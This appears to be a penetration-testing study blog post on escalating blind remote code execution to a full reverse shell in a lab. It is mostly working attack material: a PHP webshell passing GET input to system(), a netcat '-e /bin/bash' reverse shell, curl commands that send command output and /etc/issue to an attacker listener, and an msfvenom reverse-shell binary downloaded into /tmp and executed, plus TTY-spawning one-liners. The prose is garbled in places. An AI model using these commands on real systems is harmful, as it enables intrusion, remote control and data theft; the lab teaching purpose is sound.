---
layout: post
title: "Beyond Remote Code Execution"
date: "2022-07-28"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Beyond Remote Code Execution
Remote code execution occurs when user is able to execute operate operating system commands on the remote system. It should be mentioned, the code execution is rarely a vulnerabulity on its own, rather, it is usually a result of different vulnerabilities allowing the execution of OS commands. 

Example of such vulnerability causes maybe unrestricted file upload, command injection the remote scripts, or SQL injection when running a priveleged database user. 

The primary purpose will be how to detect, confirm and extend code execution vulnerability to fully functional remote shell. 

Let's take at look at the first example, you encounter a console might be executing something, but there is no output. How do you check code execution occurs.

```
192.168.139.130/script.php
192.168.139.130/script.php?c=ls&ok=ok
192.168.139.130/script.php?c=<%3Fphp+phpinfo()%3B+%3F>&ok=ok
192.168.139.130/script.php?c=<script>alert(1)<%2Fscript>&ok=ok
```

regardless we try to type various thing, we give the application does not change it behavior, we don't really know what happens on the surface. The form might be not working at all, or maybe its output is hidden. These kinds of vulnerability is called bind, as penetration tester approching them has no visibility what happens.

There are some universal methods that helps such cases. First, is the time-based one. The idea is to inject various payload that will result in stopping execution for a period of time. Let's try to inject bash sleep command in the filed and observe the response. Since we are run raw HTTP request in Burp Suite and we need to insert empty space in the parameter `c`. The response appears after 3 seconds. Let's try with 5 seconds now, it is almost exactly 5. Let's do one last check, let we try 2.

在Burp Suite的Repeater中：

Request：

```
GET /script.php?c=sleep+3&ok=ok HTTP/1.1
```

在Response的右下角，有`3.005 millis`。

Request：

```
GET /script.php?c=sleep+5&ok=ok HTTP/1.1
```

在Response的右下角，有`5.005 millis`。

Request：

```
GET /script.php?c=sleep+2&ok=ok HTTP/1.1
```

在Response的右下角，有`2.003 millis`。

This confirm the bind remote code execution vulnerability.

Let's take a look at another senario. See we want to check there is a network connect activity, so we have a fundation of our reverse shell. Can we ping attacking machine? Let's find out. In order to do so, we need network sniffer, In this case, let's use Wireshark, and set the filter just catch ICMP protocol.

display filter: `icmp`.

在攻击者机器上：

```
ifconfig | grep 192
    inet 192.168.139.130 netmask 255.255.255.0 broadcast 192.168.139.255
```

Let's inject `ping` command in the vulnerable parameter. Note that on Linux systems the ping would run infinitely by default. So we use `-c` parameter to limit the number of ping requests to 5.

在Burp Suite的Repeater中：

Request：`ping 192.168.139.130 -c 5`，Select URL encoding `Convert selection->URL->URL-encode key characters` to limit the spaces or other characters might break the HTTP request syntax.

```
GET /script.php?c=ping%20192.168.139.130%20-c%205&ok=ok HTTP/1.1
```

As you can see, exactly 5 ping request were sent.

![ping-attacker-icmp.png](/img/in-post/ine/ping-attacker-icmp.png)

This allows us to confirm the code execution vulnerability exists here.

Let's focus on improving exist exploit and impact on target system.

We will now use a differnt example for the second visibility and better understanding of the present ideas.

Let's see you are able to upload simple PHP webshell.

```
/var/www/html/server# gedit ../shell.php
```

```php
<?php

echo "<html>";

echo "<form method=GET><input type=text name=c stype='width:400px;'><input type=submit value=Execute style='height:34px;'></form>";

echo "<pre>";
$a = system($_GET["c"]);
echo "</pre></html>";
?>
```

![index-of-upload-vulnerability.png](/img/in-post/ine/index-of-upload-vulnerability.png)

```
192.168.139.130/shell.php

192.168.139.130/shell.php?c=ls
script.php
server
shell.php

192.168.139.130/shell.php?c=pwd
/var/www/html

192.168.139.130/shell.php?c=vi
Vim: Finished.
```

This is a common situation during a penetration testing, enum interactive webshell. Regardless there is a code execution vulnerability as this is a enum interactive shell, and we are unable to fully extract information from the remote host or use it as a point to another internal network. This is why code execution is just beginning. In large corpo environments, you might sometimes need to achieve few code exectution to skip to the interesting network that contain something information which can show the real impact of the portential bridege.

Our first step will be to identify the constrains, in order to achieve our shell. We need to use tool and our represent other system or being able to transfer on tools, and then invoke them using the remote webshell.

First, let's see the path variable, as it will contains the executable locations.

```
192.168.139.130/shell.php
```

```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

Now, we will visit some of these locations `/usr/bin`, and view tools there.

```
ls /usr/bin
```

Is netcat present?

```
which nc

/usr/bin/nc
```

Is there python or other programming languages installed on the remote system?

```
which python

/usr/bin/python
```

Is a curl or wget?

```
which curl

/usr/bin/curl

which wget

/usr/bin/wget
```

Let's check with netcat. We will set up a local listener on TCP port 53 and try to invoke remote shell by spwanding bash connection.

```
nc -lvp 53
```

```
ifconfig | grep 192
    inet 192.168.139.130 netmask 255.255.255.0 broadcast 192.168.139.255
```

在shell.php中执行：

```
nc 192.168.139.130 53 -e /bin/bash
```

It indeed works, but relay on netcat presents on the target system and in real life engagement will be often disapointing.

```
nc -lvp 53
listening on [any] 53 ...
connect to [192.168.139.130] from 0xluk3 [192.168.139.130] 45792
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A tool that often presents on Linux based system is `curl`. A part from command line browser capabilities. It has 5 transfer utility, which is pricessness and standing  code execution senarioes. We will now focus on abusing `curl` in the code execution senario.

Let's first try to confirm that a tcp connection can be established. Let's also set up netcat listener and try to issue will curl request to it.

```
nc -lvp 53
listening on [any] 53 ...
```

在shell.php执行：

```
curl http://192.168.139.130:53
```

```
nc -lvp 53
listening on [any] 53 ...
connect to [192.168.139.130] from 0xluk3 [192.168.139.130] 45792
GET / HTTP/1.1
Host: 192.168.139.130:53
User-Agent: curl/7.63.0
Accept: */*
```

It seems that we can establish a network connection on TCP port 53. Apart from it, the remote server issued for HTTP request.

```
nc -lvp 53
listening on [any] 53 ...
```

Let's inject backticks with command to execute the HTTP request resource name.

```
curl http://192.168.139.130:53/`whoami`
```

```
nc -lvp 53
listening on [any] 53 ...
connect to [192.168.139.130] from 0xluk3 [192.168.139.130] 45792
GET /www-data HTTP/1.1
Host: 192.168.139.130:53
User-Agent: curl/7.63.0
Accept: */*
```

The output of the command was sent from the remote server. Such a senario is useful during exploiting bind code execution vulnerabilities. It might be the only way to get the output of underline commands being executed.

Let's try to extract big pose of data. We will use the `id` command. Please note that its output contains spaces.

```
nc -lvp 53
listening on [any] 53 ...
```

在shell.php上执行：

```
curl http://192.168.139.130:53/`id`
```

```
nc -lvp 53
listening on [any] 53 ...
connect to [192.168.139.130] from 0xluk3 [192.168.139.130] 45792
GET /uid=33(www-data) HTTP/1.1
Host: 192.168.139.130:53
User-Agent: curl/7.63.0
Accept: */*
```

Space in the command output breaks the HTTP request. Using this method will not able to get any useful data back. However, maybe we can encode data somehow, let's try with base 64.

```
curl http://192.168.139.130:53/`id | base64`
```

```
nc -lvp 53
listening on [any] 53 ...
connect to [192.168.139.130] from 0xluk3 [192.168.139.130] 45792
GET /dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK HTTP/1.1
Host: 192.168.139.130:53
User-Agent: curl/7.63.0
Accept: */*
```

We will receive the base64 URL. Let's decode it and see what contains.

```
echo "dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK" | base64 -d
```

That's it, spaces can be safely matigated using the base64 command.

In another examples, we will use `curl` to transfer files between systems.

```
curl --help | grep file
```

```
└─# curl --help | grep file
 -o, --output <file>        Write to file instead of stdout
 -O, --remote-name          Write output to a file named as the remote file
 -T, --upload-file <file>   Transfer local FILE to destination
```

curl includes command line option called `-T` that allows to transfer file remotely using the PUT method. This way, we can read various files just by receiving them on the netcat listener.

在shell.php上执行：

```
curl http://192.168.139.130:53/file -T /etc/issue
```

```
nc -lvp 53
listening on [any] 53 ...
connect to [192.168.139.130] from 0xluk3 [192.168.139.130] 45792
PUT /file HTTP/1.1
Host: 192.168.139.130:53
User-Agent: curl/7.63.0
Accept: */*
Content-Length: 30
Expect: 100-continue

Kali GUN/Linux Rolling \n \l
```

The file content was sent remotely to the attacker.

```
cat /etc/issue
Kali GNU/Linux Rolling \n \l
```

But in most cases, you will be interested in tranfering files under the victim machine. For example, a Metasploit generate the reverse shell payload. To do so, we need three factors:

* an HTTP server on out machine
* a file download utility on the remote machine
* and a writable localtion on the remote machine


```
cd /var/www/html
ls
script.php server shell.php
cd server/
```

Let's start with a HTTP server. The most common and convinent solution is using the builtin python tool.

```
python -m SimpleHTTPServer 9090
Serving HTTP on 0.0.0.0 port 9090 ...
```

Simply navigate to the directory with the file you want to transfer reside. And run the server, be careful, once run, all files in directory become accessible from the netwrok, so try recommanded to create dedicated folder for the time of sharing file.

```
127.0.0.1:9090
```

Unless we are operating as root user, there are bonds of restrictive area as we are not able to write into. As safe we are download files to `/tmp` or to `/var/tmp`, which should almost be writable. At the meantime, let's prepare simple reverse shell payload using `msfvenom`.

```
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.139.130 lport=53 -f elf -o reverse53
```

```
└─/var/www/html/server# msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.139.130 lport=53 -f elf -o reverse53
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: reverse53
```

Let's then go to the final step and download file on the remote system to the `/tmp` directory.

```
python -m SimpleHTTPServer 9090
Serving HTTP on 0.0.0.0 port 9090 ...
```

在shell.php上执行：

```
curl http://192.168.139.130:9090/reverse53 -o /tmp/r
```

It seems that the shell was successfully downloaded.

```
python -m SimpleHTTPServer 9090
Serving HTTP on 0.0.0.0 port 9090 ...
192.168.139.130 - - [05/Apr/2019 09:59:36] "GET /reverse53 HTTP/1.1" 200 -
```

But before we run it, we need to make it executable.

在shell.php上执行：

```
chmod +x /tmp/r
```

We can confirm it really exists by trying to upload it back.

```
nc -lvp 9090
listening on [any] 9090 ...
```

This is especially the case we are not sure about write privileges.

```
curl http://192.168.139.130:9090 -T /tmp/r
```

![curl-T-put-back.png](/img/in-post/ine/curl-T-put-back.png)

The file is there.

Now the final step running it.

```
nc -lvp 53
listening on [any] 53 ...
```

在shell.php执行：

```
/tmp/r
```

We now have a reverse shell, but this prompt is a little bit convinient. Maybe we can make it more like a regular shell.

```
nc -lvp 53
listening on [any] 53 ...
connect to [192.168.139.130] from 0xluk3 [192.168.139.130] 45892
id
uid=33(www-data) gid=33(www-data) group=33(www-data)
whoami
www-data
```

The process upgrading reverse shell be more functional is called spawning a terminal. There is some differences between shell and terminal. For some basic understanding, a shell is a bit more functional, and an ideal terminal is like a remote ssh session.

However, for the sick of this exercises, we will show you two useful commands that will help you updrade the reverse shell a bit.

First, you can use the `bash -i`. A friendly prompt appears.

```
bash -i
bash: cannot set terminal process group (2835): Inappropriate ioctl for device
bash: no job control in this shell
www-data@0xluk3:/var/www/html$
```

The second idea is spawning the terminal using python. Note the python must be available on the system.

参考：[Spawning a TTY Shell](https://github.com/ahmetgurel/Pentest-Hints/blob/master/Spawning%20a%20TTY%20Shell.md)

```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
exec "/bin/sh"
```

Let's try to execute this code with our remote shell. The prompt changes, but also, its not empty any more.

```
bash -i
bash: cannot set terminal process group (2835): Inappropriate ioctl for device
bash: no job control in this shell
www-data@0xluk3:/var/www/html$ python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/sh")'
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```


